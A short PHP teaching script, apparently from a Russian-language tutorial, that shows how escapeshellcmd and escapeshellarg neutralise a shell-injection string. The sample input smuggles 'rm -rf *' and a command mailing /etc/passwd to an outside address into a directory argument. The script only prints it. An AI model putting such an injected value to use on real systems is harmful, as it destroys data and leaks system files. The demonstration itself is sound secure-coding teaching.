<?php ## Экранирование командной строки.
Header("Content-type: text/plain");
$toDirectory = "~; rm -rf *; sendmail hacker@domain.com </etc/passwd";
echo "cd $toDirectory\n";
$a = escapeshellcmd($toDirectory);
echo "cd $a\n";
$a = escapeshellarg($toDirectory);
echo "cd $a\n";
?>
